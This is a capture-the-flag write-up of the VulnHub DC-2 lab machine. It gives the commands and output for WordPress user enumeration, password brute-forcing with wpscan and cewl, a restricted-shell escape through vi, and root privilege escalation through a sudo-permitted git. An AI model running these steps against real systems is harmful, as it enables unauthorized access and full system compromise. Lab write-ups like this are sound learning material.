## Summary

Hello all, let's continue the DC series. This box it's about wordpress exploitation, we enumerate wordpress and we find out 3 users and we start a brute force on them. The users use the same password on the system so we get access using SSH. Once we get shell we have to bypass rbash. Then we can use switch to user jerry and privesc to root is a simple sudo -l exploitation. Let's pwn it!

## PoC

## Target IP

Always first step is to find target IP address, i prefer to use the `arp-scan` utility. Then we'll save the IP address in a variable.

```
$ arp-scan --localnet | grep "VMware"
192.168.1.16	00:0c:29:a2:5d:8f	VMware, Inc.
$ ip=192.168.1.16
```

## Enumeration/Reconnaissance

Now as always let's continue with a nmap scan.

```
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-20 13:47 EET
Nmap scan report for dc-2 (192.168.1.16)

$ nmap -p 80,7744 -sC -sV -oN nmap/dc2.vulnhub $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-20 13:50 EET

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))

```

We can see `nmap` tell us an important thing: `http-title: Did not follow redirect to http://dc-2/` We have to add `dc-2` to our `/etc/hosts` file.

For beginners, `/etc/hosts` file translate hostnames to IP addresses. In CTF we use it for 2 reasons:

+ It's easier to remember the box name than remembering the IP address.

+ The main reason it to deal with virtual hosts. Virtual hosts allow us to host multiple domains or sites on a single server. If we browse the box if the raw IP address, the host header won't be set properly and we'll end up with a default page or error page.

```
$ echo "192.168.1.16 dc-2" | tee -a /etc/hosts
192.168.1.16 dc-2
$ cat /etc/hosts | tail -1
192.168.1.16 dc-2
```

Now if we visit the website, we can see it loads without errors & is running wordpress:

Since it's running wordpress, let's fire up a wpscan.

```
$ wpscan --no-banner --url http://dc-2/ -e ap,u -o scans/wpscan1.txt
$ cat scans/wpscan1.txt

We have 3 users, perfect. In wordpress menu we can see a `flag` that provide us a really important tip!

![](https://i.imgur.com/t7MuLSe.png)

Let's use `cewl` to generate a custom wordlist.

```
$ cewl http://dc-2/ -w wordlist.txt
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
$ wc -l wordlist.txt
238 wordlist.txt
```

## Shell as tom

Now let's start a brute force attack on 3 users, using `wpscan`.

```
$ wpscan --no-banner --url http://dc-2/ -U admin,tom,jerry -P wordlist.txt

...data...

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

Perfect, i tried to login as tom using SSH and it worked! But sadly we're into a restricted shell. A restricted shell only allows us to perform specific system commands.

```
$ ssh tom@$ip -p 7744
tom@192.168.1.16's password:

tom@DC-2:~$ whoami
-rbash: whoami: command not found
tom@DC-2:~$ id
-rbash: id: command not found
```

To understand if we're into a restricted shell we can simply check which shell we are using:

```
tom@DC-2:~$ echo $0
-rbash
```

To bypass that now there are ton of ways we can try, but in CTF there is a common way using `vi/vim`:

Execute `vi` and type:

```
:set shell=/bin/bash
after
:shell
```

Now we're into bash but we still can't execute commands.

```
tom@DC-2:~$ whoami
bash: whoami: command not found
tom@DC-2:~$ id
bash: id: command not found
```

Seems like `PATH` environment variable is broken, i googled for a default `PATH` and i found the ubuntu's default and i used it and it worked!

```
tom@DC-2:~$ export PATH=/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
tom@DC-2:~$ whoami
tom
```

## Shell as jerry

Now we can simply switch to user jerry using the password from the brute force.

```
tom@DC-2:~$ su - jerry
Password:
jerry@DC-2:~$ whoami
jerry
```

## Shell as root

Privilege escalation to root is simple, we just have to check `sudo -l` that tell us we can execute `git` as root.

```
jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

```
jerry@DC-2:~$ sudo git -p help config

!/bin/bash
root@DC-2:/home/jerry# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

## Reading the flag(s)

```
root@DC-2:~# cat final-flag.txt

Congratulatons!!!
